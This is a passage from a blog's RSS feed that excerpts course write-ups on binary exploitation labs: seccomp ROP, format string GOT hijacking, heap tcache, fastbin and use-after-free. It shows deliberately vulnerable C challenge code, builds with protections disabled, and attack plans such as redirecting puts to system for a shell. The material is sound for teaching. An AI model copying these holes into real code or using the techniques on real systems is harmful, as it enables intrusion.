must use &lt;code>mprotect&lt;/code> to change permission of global variable &lt;code>name&lt;/code> just like &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJhgXGKci">lecture 0x04&lt;/a>, add these line in original code
&lt;pre tabindex="0">&lt;code class="language-c!" data-lang="c!">#include &amp;lt;sys/mman.h&amp;gt;
mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
&lt;/code>&lt;/pre>&lt;strong>Before &lt;code>mprotect&lt;/code> - &lt;code>vmmap&lt;/code>&lt;/strong>
&lt;img src="https://imgur.com/z8cK5SM.png" alt="" />
&lt;img src="https://imgur.com/J6qKJ8N.png" alt="" />
&lt;strong>After &lt;code>mprotect&lt;/code> - &lt;code>vmmap&lt;/code>&lt;/strong>
&lt;img src="https://imgur.com/gNr8Fya.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Construct &lt;code>ROP&lt;/code> chain&lt;/p></description></item><item><title>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/</guid><description>&lt;h1 id="simple-pwn---0x10seccomplab---rop2win">
 Simple PWN - 0x10(&lt;code>seccomp&lt;/code>/Lab - &lt;code>rop2win&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x10seccomplab---rop2win">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10005&lt;/code>&lt;/p>
&lt;h2 id="seccomp-background">
 &lt;code>seccomp&lt;/code> background
 &lt;a class="anchor" href="#seccomp-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/ktoVQB99Gj4?t=8457">Pwn week1&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;

char fn[0x20];
char ROP[0x100];


// fd = open(&amp;#34;flag&amp;#34;, 0);
// read(fd, buf, 0x30);
// write(1, buf, 0x30); // 1 --&amp;gt; stdout

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
 seccomp_load(ctx);
 seccomp_release(ctx);

 printf(&amp;#34;Give me filename: &amp;#34;);
 read(0, fn, 0x20);

 printf(&amp;#34;Give me ROP: &amp;#34;);
 read(0, ROP, 0x100);

 char overflow[0x10];
 printf(&amp;#34;Give me overflow: &amp;#34;);
 read(0, overflow, 0x30);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x11(format string bug)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/</guid><description>&lt;h1 id="simple-pwn---0x11format-string-bug">
 Simple PWN - 0x11(format string bug)
 &lt;a class="anchor" href="#simple-pwn---0x11format-string-bug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="format-string-bug-background">
 format string bug background
 &lt;a class="anchor" href="#format-string-bug-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/g-fact-31/">printf %n&lt;/a>
&lt;img src="https://media.geeksforgeeks.org/wp-content/cdn-uploads/20191009172738/n-in-printf.jpg" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char fmt[0x20];

 system(&amp;#34;echo &amp;#39;Give me fmt: &amp;#39;&amp;#34;);
 read(0, fmt, 0x20);
 printf(fmt);

 system(&amp;#34;echo &amp;#39;Give me string: &amp;#39;&amp;#34;);
 read(0, fmt, 0x20);
 puts(fmt);

 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>In this problem, we can consider to use &lt;code>format string bug&lt;/code> to achieve &lt;code>GOT hijacking&lt;/code> without buffer overflow.&lt;/li>
&lt;li>&lt;strong>The main idea is totally the same as &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/S1BBpSR5s">GOT hijacking lecture&lt;/a>&lt;/strong>&lt;/li>
&lt;li>Thus, we can observe which function can be overlapped by &lt;code>system plt&lt;/code> → &lt;font color="FF0000">&lt;strong>&lt;code>puts function&lt;/code>&lt;/strong>&lt;/font>
&lt;ul>
&lt;li>Because&amp;hellip;
&lt;code>puts&lt;/code> just needs one argument like &lt;code>system&lt;/code> function, but how about &lt;code>printf&lt;/code>?
Unfortunately, it appeared before 2nd read function, because 2nd &lt;code>read&lt;/code> needs to store the argument for &lt;code>system&lt;/code> function such as &lt;code>sh\x00&lt;/code>.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---got-hijacking--format-string-bug">
 Exploit - GOT hijacking + format string bug
 &lt;a class="anchor" href="#exploit---got-hijacking--format-string-bug">#&lt;/a>
&lt;/h2>
&lt;p>&lt;strong>Our goal is hijack &lt;code>puts GOT&lt;/code> to &lt;code>system plt&lt;/code>&lt;/strong>&lt;/p></description></item><item><title>Simple PWN - 0x12(Lab - `rop++`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/</guid><description>&lt;h1 id="simple-pwn---0x12lab---rop">
 Simple PWN - 0x12(Lab - &lt;code>rop++&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x12lab---rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10004&lt;/code>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main()
{
 char buf[0x10];
 const char *msg = &amp;#34;show me rop\n&amp;gt; &amp;#34;;

 write(1, msg, strlen(msg));
 read(0, buf, 0x200);

 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-makefile!" data-lang="makefile!">gcc -fno-stack-protector -static -o chal rop++.c
&lt;/code>&lt;/pre>&lt;h2 id="analyze">
 Analyze
 &lt;a class="anchor" href="#analyze">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Obviously buffer overflow!!!&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Check protector&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec chal
[*] &amp;#39;/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal&amp;#39;
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Preliminary idea is using &lt;code>ROP&lt;/code> chain and get shell, but the problem is where can I write &lt;code>/bin/sh\x00&lt;/code>? We can use &lt;code>vmmap&lt;/code> to observe where section is writable and readable → &lt;code>0x4c5000~0x4c800&lt;/code>
&lt;img src="https://imgur.com/018Nk8F.png" alt="" />&lt;/p></description></item><item><title>Simple PWN - 0x13(Lab - `how2know`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/</guid><description>&lt;h1 id="simple-pwn---0x13lab---how2know">
 Simple PWN - 0x13(Lab - &lt;code>how2know&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x13lab---how2know">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10002&lt;/code>
Environment Version: 22.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

static char flag[0x30];

int main()
{
 void *addr;
 int fd;
 scmp_filter_ctx ctx;

 addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 if ((unsigned long)addr == -1)
 perror(&amp;#34;mmap&amp;#34;), exit(1);
 
 fd = open(&amp;#34;/home/chal/flag&amp;#34;, O_RDONLY);
 if (fd == -1)
 perror(&amp;#34;open&amp;#34;), exit(1);
 read(fd, flag, 0x30);
 close(fd);

 write(1, &amp;#34;talk is cheap, show me the code\n&amp;#34;, 33);
 read(0, addr, 0x1000);

 ctx = seccomp_init(SCMP_ACT_KILL);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 seccomp_load(ctx);
 seccomp_release(ctx);

 ((void(*)())addr)();

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x14(Simple HEAP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/</guid><description>&lt;h1 id="simple-pwn---0x14simple-heap">
 Simple PWN - 0x14(Simple HEAP)
 &lt;a class="anchor" href="#simple-pwn---0x14simple-heap">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="heap-background">
 HEAP background
 &lt;a class="anchor" href="#heap-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/rMqvL9j0QaM">Advanced Binary Exploitation (Pwn) - Heap Exploitation&lt;/a>
&lt;a href="https://youtu.be/Xppj8lA04qQ">SS111-Pwn2&lt;/a>&lt;/p>
&lt;h2 id="allocate-a-memory">
 Allocate a memory
 &lt;a class="anchor" href="#allocate-a-memory">#&lt;/a>
&lt;/h2>
&lt;h3 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *ptr;
 ptr = malloc(0x30);
 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo gcc -o simple_heap simple_heap.c -no-pie
&lt;/code>&lt;/pre>&lt;h3 id="analyze">
 Analyze
 &lt;a class="anchor" href="#analyze">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Before executing &lt;code>malloc&lt;/code>, there is no &lt;code>heap&lt;/code> space in memory layout
&lt;img src="https://imgur.com/h9ibSyk.png" alt="" />&lt;/p></description></item><item><title>Simple PWN - 0x15(Lab - `heapmath`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/</guid><description>&lt;h1 id="simple-pwn---0x15lab---heapmath">
 Simple PWN - 0x15(Lab - &lt;code>heapmath&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x15lab---heapmath">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;time.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);
 srand(time(NULL));

 void *tcache_chk[7] = {0};
 unsigned char tcachebin[3][7] = {0}; // 0x20, 0x30, 0x40
 unsigned int tcachebin_counts[4] = {0};
 unsigned long tcache_size[7] = {0};
 unsigned long tcache_free_order[7] = {0};

 puts(&amp;#34;----------- ** tcache chall ** -----------&amp;#34;);
 unsigned long tmp = 0;
 for (int i = 0; i &amp;lt; 7; i++) {
 tmp = (rand() % 0x21) + 0x10; // 0x10 ~ 0x30
 tcache_size[i] = tmp;
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 repeat:
 tmp = rand() % 7;
 for (int j = 0; j &amp;lt; i; j++)
 if (tmp == tcache_free_order[j]) goto repeat;
 tcache_free_order[i] = tmp;
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 tcache_chk[i] = malloc( tcache_size[i] );
 printf(&amp;#34;char *%c = (char *) malloc(0x%lx);\n&amp;#34;, &amp;#39;A&amp;#39; + i, tcache_size[i]);
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 int idx = tcache_free_order[i];
 free(tcache_chk[ idx ]);
 printf(&amp;#34;free(%c);\n&amp;#34;, &amp;#39;A&amp;#39; + (unsigned char) idx);

 tmp = tcache_size[ idx ] - 0x8;
 if (tmp % 0x10)
 tmp = (tmp &amp;amp; ~0xf) + 0x20;
 else
 tmp += 0x10;

 unsigned int binidx = ((tmp - 0x20) / 0x10);
 unsigned int bincnt = tcachebin_counts[ binidx ];
 tcachebin[ binidx ][ bincnt ] = &amp;#39;A&amp;#39; + (unsigned char) idx;
 tcachebin_counts[ binidx ]++;
 }

 char tmpbuf[0x100] = {0};
 char ansbuf[3][0x100] = {0};
 for (int i = 0; i &amp;lt; 3; i++) {
 for (int j = 6; j &amp;gt;= 0; j--)
 if (tcachebin[i][j]) {
 sprintf(tmpbuf, &amp;#34;%c --&amp;gt; &amp;#34;, tcachebin[i][j]);
 strcat(ansbuf[i], tmpbuf);
 }
 strcat(ansbuf[i], &amp;#34;NULL&amp;#34;);
 }
 puts(&amp;#34;&amp;#34;);
 for (int i = 0; i &amp;lt; 3; i++) {
 printf(&amp;#34;[chunk size] 0x%x: &amp;#34;, (i+2) * 0x10);
 if (i == 0) {
 printf(&amp;#34;%s\t(just send \&amp;#34;%s\&amp;#34;)\n&amp;#34;, ansbuf[i], ansbuf[i]);
 } else {
 printf(&amp;#34;?\n&amp;gt; &amp;#34;);
 fgets(tmpbuf, 0x100, stdin);
 if (!strncmp(tmpbuf, ansbuf[i], strlen(ansbuf[i]))) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: \&amp;#34;%s\&amp;#34;\n&amp;#34;, ansbuf[i]);
 exit(0);
 }
 }
 }

 puts(&amp;#34;\n----------- ** address chall ** -----------&amp;#34;);
 int cmp1 = 0;
 int cmp2 = 0;
 unsigned long ans_addr = 0;

 cmp1 = rand() % 7;
 while ((cmp2 = rand() % 7) == cmp1);
 if (cmp1 &amp;gt; cmp2) {
 tmp = cmp1;
 cmp1 = cmp2;
 cmp2 = tmp;
 }

 printf(&amp;#34;assert( %c == %p );\n&amp;#34;, &amp;#39;A&amp;#39; + cmp1, tcache_chk[ cmp1 ]);
 printf(&amp;#34;%c == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;,
 &amp;#39;A&amp;#39; + cmp2, tcache_chk[ cmp1 ]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == (unsigned long) tcache_chk[ cmp2 ]) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: %p\n&amp;#34;, tcache_chk[ cmp2 ]);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** index chall ** -----------&amp;#34;);
 unsigned long *fastbin[2] = {0};
 unsigned long fastbin_size = 0;
 unsigned long secret_idx = 0, result_idx = 0, res = 0;

 fastbin_size = (rand() % 0x31) + 0x40; // 0x40 ~ 0x70
 fastbin_size &amp;amp;= ~0xf;
 fastbin[0] = (unsigned long *) malloc( fastbin_size );
 fastbin[1] = (unsigned long *) malloc( fastbin_size );
 
 printf(&amp;#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;X&amp;#39;, fastbin_size);
 printf(&amp;#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;Y&amp;#39;, fastbin_size);

 secret_idx = rand() % (fastbin_size / 8);
 fastbin[1][ secret_idx ] = 0xdeadbeef;
 result_idx = ((unsigned long)(&amp;amp;fastbin[1][ secret_idx ]) - (unsigned long)(&amp;amp;fastbin[0][0])) / 8;
 
 printf(&amp;#34;Y[%lu] = 0xdeadbeef;\n&amp;#34;, secret_idx);
 printf(&amp;#34;X[?] == 0xdeadbeef\t(just send an integer, e.g. \&amp;#34;8\&amp;#34;)\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%lu&amp;#34;, &amp;amp;res);

 if (fastbin[0][res] == 0xdeadbeef) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: %lu\n&amp;#34;, result_idx);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** tcache fd chall ** -----------&amp;#34;);
 free(fastbin[0]);
 free(fastbin[1]);
 printf(&amp;#34;free(X);\nfree(Y);\nassert( Y == %p );\n&amp;#34;, fastbin[1]);
 printf(&amp;#34;fd of Y == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;, fastbin[1]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == *fastbin[1]) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: 0x%lx\n&amp;#34;, *fastbin[1]);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** fastbin fd chall (final) ** -----------&amp;#34;);
 puts(&amp;#34;[*] Restore the chunk to X and Y&amp;#34;);
 printf(&amp;#34;%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;Y&amp;#39;, fastbin_size);
 printf(&amp;#34;%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;X&amp;#39;, fastbin_size);
 fastbin[1] = malloc(fastbin_size);
 fastbin[0] = malloc(fastbin_size);
 printf(&amp;#34;[*] Do something to fill up 0x%lx tcache\n...\n[*] finish\n&amp;#34;, fastbin_size + 0x10);
 void *tmpchk[7];
 for (int i = 0; i &amp;lt; 7; i++)
 tmpchk[i] = malloc(fastbin_size);
 for (int i = 0; i &amp;lt; 7; i++)
 free(tmpchk[i]);
 printf(&amp;#34;free(X);\nfree(Y);\nassert( Y == %p );\n&amp;#34;, fastbin[1]);
 free(fastbin[0]);
 free(fastbin[1]);
 printf(&amp;#34;fd of Y == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;, fastbin[1]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == *fastbin[1]) {
 puts(&amp;#34;Correct !&amp;#34;);
 memset(tmpbuf, 0, 0x31);
 
 int fd = open(&amp;#34;/home/heapmath/flag&amp;#34;, O_RDONLY);
 read(fd, tmpbuf, 0x30);
 close(fd);
 printf(&amp;#34;Here is your flag: %s\n&amp;#34;, tmpbuf);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: 0x%lx\n&amp;#34;, *fastbin[1]);
 exit(0);
 }
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x16(simple_smallbin)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/</guid><description>&lt;h1 id="simple-pwn-0x16simple_smallbin">
 Simple PWN 0x16(simple_smallbin)
 &lt;a class="anchor" href="#simple-pwn-0x16simple_smallbin">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://imgur.com/teWNhbh.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://imgur.com/kCTN7cs.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *ptrs[7];
 void *smallbin;
 int i;

 for (i = 0; i &amp;lt; 7; i++)
 ptrs[i] = malloc(0x108); // 0x110 chunk size

 smallbin = malloc(0x108);
 malloc(0x18);

 // aim to fill up tcache
 while(i)
 free(ptrs[--i]);
 
 free(smallbin);
 // trigger unsorted bin dispatch
 malloc(0x870);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x17(UAF - leak information)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/</guid><description>&lt;h1 id="simple-pwn-0x17uaf---leak-information">
 Simple PWN 0x17(UAF - leak information)
 &lt;a class="anchor" href="#simple-pwn-0x17uaf---leak-information">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="uaf-backgroud">
 UAF backgroud
 &lt;a class="anchor" href="#uaf-backgroud">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/MwjSNFQIx0c">SS111-Pwn2&lt;/a>
&lt;a href="https://youtu.be/rMqvL9j0QaM?t=3009">Advanced Binary Exploitation (Pwn) - Heap Exploitation&lt;/a>
&lt;img src="https://imgur.com/nFDhGiC.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *p1, *p2;
 p1 = malloc(0x30);
 p2 = malloc(0x30);

 free(p1);
 free(p2);

 puts(p2);
}
&lt;/code>&lt;/pre>&lt;p>If we set the pointer to &lt;code>NULL&lt;/code> after it was freed, then we can get some vital info. from this chunk.&lt;/p></description></item><item><title>Simple PWN 0x18(Lab - `babynote`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/</guid><description>&lt;h1 id="simple-pwn-0x18lab---babynote">
 Simple PWN 0x18(Lab - &lt;code>babynote&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x18lab---babynote">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>hook - &lt;a href="https://youtu.be/MwjSNFQIx0c?t=838">SS111-Pwn2&lt;/a>
&lt;img src="https://imgur.com/lx8zR2J.png" alt="" />
&lt;a href="https://blog.xuite.net/peterlee.tw/twblog/112094832">Hook簡介&lt;/a>
&lt;a href="https://www.google.com/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=&amp;amp;cad=rja&amp;amp;uact=8&amp;amp;ved=2ahUKEwjIxp70jeL8AhUjQPUHHde8BDcQFnoECA4QAQ&amp;amp;url=https%3A%2F%2Fxtutlab.blogspot.com%2F2018%2F10%2Fhook-function.html&amp;amp;usg=AOvVaw26FwxmT40uQgIsFIlbjs2k">Hook Function (攔截函式)&lt;/a>&lt;/li>
&lt;li>The process of free and priority
Assume we malloc a memory with size over &lt;font color="FF0000">&lt;code>0x410&lt;/code>&lt;/font>, then when we free it, it&amp;rsquo;ll be classified to &lt;font color="FF0000">&lt;code>Unsorted bin&lt;/code>&lt;/font> instead of &lt;code>tcache&lt;/code>
&lt;img src="https://imgur.com/kCTN7cs.png" alt="" />
